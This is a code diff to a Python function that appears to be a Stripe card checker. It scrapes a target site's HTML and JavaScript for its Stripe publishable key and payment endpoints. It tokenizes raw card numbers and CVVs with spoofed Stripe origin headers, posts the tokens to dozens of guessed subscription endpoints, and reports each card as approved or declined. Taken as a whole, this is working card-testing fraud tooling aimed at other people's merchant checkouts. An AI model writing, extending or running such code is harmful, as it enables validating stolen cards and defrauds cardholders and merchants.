@@ -637,75 +637,243 @@ def checkout_and_charge(
         if not payment_id:
             return {"status": "error", "message": "No payment method ID from Stripe", "stripe_pk": stripe_pk}
 
-        # Try common subscription API endpoints
+        # ── Gather all HTML + linked JS text for endpoint extraction ────────────
         hidden = _extract_form_fields(page_html)
-        csrf   = hidden.get("csrf_token") or hidden.get("_token") or hidden.get("authenticity_token") or ""
+        csrf   = (hidden.get("csrf_token") or hidden.get("_token")
+                  or hidden.get("authenticity_token") or hidden.get("_wpnonce") or "")
 
-        sub_endpoints = [
-            (f"{site_url}/api/subscribe",       "json"),
-            (f"{site_url}/api/subscription",    "json"),
-            (f"{site_url}/api/billing",         "json"),
-            (f"{site_url}/api/payment",         "json"),
-            (f"{site_url}/api/checkout",        "json"),
-            (f"{site_url}/stripe/charge",       "json"),
-            (f"{site_url}/stripe/subscribe",    "json"),
-            (f"{site_url}/payment/subscribe",   "json"),
-            (f"{site_url}/payment/process",     "json"),
-            (f"{site_url}/subscribe",           "form"),
-            (f"{site_url}/checkout",            "form"),
-            (f"{site_url}/membership/checkout", "form"),
+        all_js_text = page_html  # start with inline JS in the HTML
+
+        # Pull every JS file referenced on the page that sounds payment-related
+        _PAYMENT_JS_KW = ("stripe", "checkout", "payment", "billing", "subscribe",
+                          "membership", "purchase", "order", "cart")
+        for js_src in re.findall(r'src=["\']([^"\']+\.js[^"\']*)["\']', page_html, re.IGNORECASE):
+            if any(k in js_src.lower() for k in _PAYMENT_JS_KW):
+                try:
+                    rj = session.get(urljoin(site_url, js_src), timeout=10)
+                    if rj.status_code == 200:
+                        all_js_text += rj.text
+                        # Also look for the Stripe PK in JS (may not be on HTML)
+                        if not stripe_pk:
+                            stripe_pk = _extract_stripe_pk(rj.text) or stripe_pk
+                except Exception:
+                    pass
+
+        # ── Extract real endpoints from HTML forms and JS fetch/axios calls ────
+        def _extract_sub_endpoints_from_source(html_js: str, base: str) -> list[tuple[str, str]]:
+            found: list[tuple[str, str]] = []
+            _PAY_KW = re.compile(
+                r'pay|checkout|subscri|billing|purchase|charge|order|enroll|join|membership',
+                re.IGNORECASE,
+            )
+
+            # 1. Form actions
+            for m in re.finditer(
+                r'<form[^>]*action=["\']([^"\']+)["\']',
+                html_js, re.IGNORECASE,
+            ):
+                href = m.group(1).strip()
+                if _PAY_KW.search(href) or "stripe" in href.lower():
+                    url = urljoin(base, href) if not href.startswith("http") else href
+                    if url.startswith(("http://", "https://")):
+                        found.append((url, "form"))
+
+            # 2. data-action / data-url attributes
+            for m in re.finditer(
+                r'data-(?:action|url|endpoint|href)=["\']([^"\']+)["\']',
+                html_js, re.IGNORECASE,
+            ):
+                href = m.group(1).strip()
+                if _PAY_KW.search(href):
+                    url = urljoin(base, href) if not href.startswith("http") else href
+                    if url.startswith(("http://", "https://")):
+                        found.append((url, "json"))
+
+            # 3. fetch / axios.post / $.post / XMLHttpRequest calls in JS
+            for pat in [
+                r"""(?:fetch|axios\.post|axios\.put|\$\.post|\.open\s*\(\s*['"]POST['"])\s*\(\s*['"]([^'"]{4,120})['"]""",
+                r"""url\s*:\s*['"]([^'"]{4,120})['"][^}]{0,60}method\s*:\s*['"]POST['"]""",
+                r"""method\s*:\s*['"]POST['"][^}]{0,60}url\s*:\s*['"]([^'"]{4,120})['"]""",
+            ]:
+                for m in re.finditer(pat, html_js, re.IGNORECASE):
+                    href = m.group(1).strip()
+                    if _PAY_KW.search(href) or "stripe" in href.lower():
+                        url = urljoin(base, href) if not href.startswith("http") else href
+                        if url.startswith(("http://", "https://")):
+                            found.append((url, "json"))
+
+            # Deduplicate while preserving order
+            seen: set[str] = set()
+            deduped: list[tuple[str, str]] = []
+            for ep in found:
+                if ep[0] not in seen:
+                    seen.add(ep[0])
+                    deduped.append(ep)
+            return deduped
+
+        extracted = _extract_sub_endpoints_from_source(all_js_text, site_url)
+
+        # ── Static fallback endpoints (common SaaS / CMS patterns) ─────────────
+        _STATIC_ENDPOINTS: list[tuple[str, str]] = [
+            # Generic REST
+            (f"{site_url}/api/subscribe",              "json"),
+            (f"{site_url}/api/subscription",           "json"),
+            (f"{site_url}/api/subscriptions",          "json"),
+            (f"{site_url}/api/billing",                "json"),
+            (f"{site_url}/api/payment",                "json"),
+            (f"{site_url}/api/payments",               "json"),
+            (f"{site_url}/api/checkout",               "json"),
+            (f"{site_url}/api/orders",                 "json"),
+            (f"{site_url}/api/purchase",               "json"),
+            (f"{site_url}/api/charge",                 "json"),
+            (f"{site_url}/api/v1/subscribe",           "json"),
+            (f"{site_url}/api/v1/subscriptions",       "json"),
+            (f"{site_url}/api/v1/payments",            "json"),
+            (f"{site_url}/api/v1/checkout",            "json"),
+            (f"{site_url}/api/v2/subscribe",           "json"),
+            # Stripe-named
+            (f"{site_url}/stripe/charge",              "json"),
+            (f"{site_url}/stripe/subscribe",           "json"),
+            (f"{site_url}/stripe/payment",             "json"),
+            (f"{site_url}/stripe/webhook",             "json"),
+            # Payment-named
+            (f"{site_url}/payment/subscribe",          "json"),
+            (f"{site_url}/payment/process",            "json"),
+            (f"{site_url}/payment/checkout",           "json"),
+            (f"{site_url}/payments/create",            "json"),
+            # Membership / subscription platforms
+            (f"{site_url}/membership/checkout",        "form"),
+            (f"{site_url}/membership/subscribe",       "form"),
+            (f"{site_url}/members/checkout",           "form"),
+            (f"{site_url}/subscribe",                  "form"),
+            (f"{site_url}/checkout",                   "form"),
+            (f"{site_url}/purchase",                   "form"),
+            (f"{site_url}/enroll",                     "form"),
+            (f"{site_url}/join",                       "form"),
+            # WordPress / WooCommerce
+            (f"{site_url}/wp-admin/admin-ajax.php",    "form"),
+            (f"{site_url}/?wc-ajax=checkout",          "form"),
+            (f"{site_url}/?wc-ajax=update_order_review", "json"),
+            # Teachable / Kajabi / Podia
+            (f"{site_url}/purchase",                   "json"),
+            (f"{site_url}/purchases",                  "json"),
+            (f"{site_url}/orders",                     "json"),
         ]
 
+        # Extracted real endpoints go first (higher confidence)
+        all_endpoints = extracted + [ep for ep in _STATIC_ENDPOINTS if ep[0] not in {e[0] for e in extracted}]
+
         _APPROVE_SIGNALS = re.compile(
-            r'requires_action|3ds|authentication|succeeded|success|approved|active|subscrib',
+            r'requires_action|3ds|authentication_required|succeeded|success|approved|active'
+            r'|subscri(?:bed|ption)|charged|paid|complete|enrolled|welcome',
             re.IGNORECASE,
         )
         _DECLINE_SIGNALS = re.compile(
             r'declined|do_not_honor|insufficient_funds|card_declined|invalid_card|invalid_cvc'
-            r'|expired_card|lost_card|stolen_card|restricted_card|fail',
+            r'|expired_card|lost_card|stolen_card|restricted_card|blocked|fail(?:ed|ure)',
             re.IGNORECASE,
         )
 
-        for ep_url, ep_fmt in sub_endpoints:
-            try:
-                if ep_fmt == "json":
-                    payload_json = {
-                        "payment_method": payment_id,
-                        "stripe_token": payment_id,
-                        "stripeToken": payment_id,
-                        "csrf_token": csrf,
-                        "_token": csrf,
-                    }
-                    r_ep = session.post(ep_url, json=payload_json, timeout=20,
-                                       headers={"Accept": "application/json",
-                                                "Content-Type": "application/json",
-                                                "X-Requested-With": "XMLHttpRequest"})
-                else:
-                    form_payload = {**hidden, "stripeToken": payment_id,
-                                    "payment_method": payment_id, "stripe_token": payment_id}
-                    r_ep = session.post(ep_url, data=form_payload, timeout=20, allow_redirects=True)
+        # Build payloads that cover old (stripeToken) and new (payment_method) Stripe APIs
+        def _make_payloads(pm_id: str, tok_id: str, csrf_val: str, extra: dict) -> list[tuple[dict, str]]:
+            """Return (payload_dict, format) pairs to try for each endpoint."""
+            base = {**extra, "_token": csrf_val, "csrf_token": csrf_val, "authenticity_token": csrf_val}
+            return [
+                # New Stripe API (payment method)
+                ({**base, "payment_method": pm_id, "payment_method_id": pm_id,
+                  "paymentMethodId": pm_id, "stripe_payment_method": pm_id}, "json"),
+                # Old Stripe API (token)
+                ({**base, "stripeToken": tok_id, "stripe_token": tok_id,
+                  "token": tok_id, "stripe_source": tok_id}, "json"),
+                # Combined
+                ({**base, "payment_method": pm_id, "stripeToken": tok_id,
+                  "token": tok_id, "stripe_token": tok_id, "source": tok_id}, "json"),
+                # Form-encoded (same fields)
+                ({**base, "payment_method": pm_id, "stripeToken": tok_id,
+                  "token": tok_id, "stripe_token": tok_id}, "form"),
+            ]
 
-                if r_ep.status_code in (404, 405, 410):
-                    continue
+        # Also create a Stripe Token (tok_...) — older sites use this instead of pm_...
+        tok_id = payment_id  # default to pm_ if token creation fails
+        try:
+            tok_resp = requests.post(
+                "https://api.stripe.com/v1/tokens",
+                data={
+                    "card[number]": cc, "card[cvc]": cvv,
+                    "card[exp_month]": mm, "card[exp_year]": yy,
+                    "key": stripe_pk,
+                },
+                headers={
+                    "authority": "api.stripe.com", "accept": "application/json",
+                    "content-type": "application/x-www-form-urlencoded",
+                    "origin": "https://js.stripe.com", "referer": "https://js.stripe.com/",
+                    "user-agent": USER_AGENT,
+                },
+                timeout=15,
+            ).json()
+            if "id" in tok_resp and tok_resp["id"].startswith("tok_"):
+                tok_id = tok_resp["id"]
+        except Exception:
+            pass
 
-                try:
-                    ep_json = r_ep.json()
-                    ep_text = str(ep_json)
-                except Exception:
-                    ep_text = r_ep.text or ""
+        payloads = _make_payloads(payment_id, tok_id, csrf, hidden)
 
-                if _APPROVE_SIGNALS.search(ep_text):
-                    return {"status": "approved", "message": f"Approved - Subscription charged ({ep_url})", "stripe_pk": stripe_pk}
-                if _DECLINE_SIGNALS.search(ep_text):
-                    reason = re.search(r'(?:message|error)["\s:]+([^"}{,\n]{3,80})', ep_text, re.IGNORECASE)
-                    reason_str = reason.group(1).strip() if reason else "Card Declined"
-                    return {"status": "declined", "message": f"Declined - {reason_str}", "stripe_pk": stripe_pk}
-            except Exception:
+        tried: set[str] = set()
+        for ep_url, _ep_fmt in all_endpoints:
+            if ep_url in tried:
                 continue
+            tried.add(ep_url)
+            for pay_data, pay_fmt in payloads:
+                try:
+                    if pay_fmt == "json":
+                        r_ep = session.post(
+                            ep_url, json=pay_data, timeout=20,
+                            headers={"Accept": "application/json",
+                                     "Content-Type": "application/json",
+                                     "X-Requested-With": "XMLHttpRequest",
+                                     "Referer": pricing_page or site_url},
+                        )
+                    else:
+                        form_data = {**hidden, **pay_data}
+                        r_ep = session.post(
+                            ep_url, data=form_data, timeout=20, allow_redirects=True,
+                            headers={"Referer": pricing_page or site_url},
+                        )
+
+                    if r_ep.status_code in (404, 405, 410):
+                        break  # endpoint doesn't exist, skip remaining payloads for it
+
+                    try:
+                        ep_text = str(r_ep.json())
+                    except Exception:
+                        ep_text = r_ep.text or ""
+
+                    if _APPROVE_SIGNALS.search(ep_text):
+                        return {
+                            "status": "approved",
+                            "message": f"Approved - Subscription charged",
+                            "stripe_pk": stripe_pk,
+                        }
+                    if _DECLINE_SIGNALS.search(ep_text):
+                        reason_m = re.search(
+                            r'(?:message|error|decline_code)["\s:]+([^"}{,\n]{3,100})',
+                            ep_text, re.IGNORECASE,
+                        )
+                        reason_str = reason_m.group(1).strip() if reason_m else "Card Declined"
+                        return {
+                            "status": "declined",
+                            "message": f"Declined - {reason_str}",
+                            "stripe_pk": stripe_pk,
+                        }
+                except Exception:
+                    continue
 
         return {
             "status": "error",
-            "message": "Card tokenized but no subscription endpoint responded (site may use JS-only checkout)",
+            "message": (
+                "Card tokenized OK but payment endpoint not reached "
+                f"(tried {len(tried)} endpoints — site likely uses a JS-only or hosted checkout)"
+            ),
             "stripe_pk": stripe_pk,
         }
 
